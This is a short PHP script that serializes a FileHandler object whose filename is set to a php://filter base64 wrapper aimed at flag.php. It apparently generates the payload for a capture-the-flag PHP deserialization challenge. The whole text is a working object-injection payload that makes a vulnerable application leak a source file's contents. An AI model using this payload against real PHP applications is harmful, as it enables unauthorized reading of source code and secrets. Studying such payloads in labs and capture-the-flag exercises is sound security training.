<?php
class FileHandler {

    public $op=2;
    public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
    public $content;

}

$obj = new FileHandler();
echo serialize($obj);




?>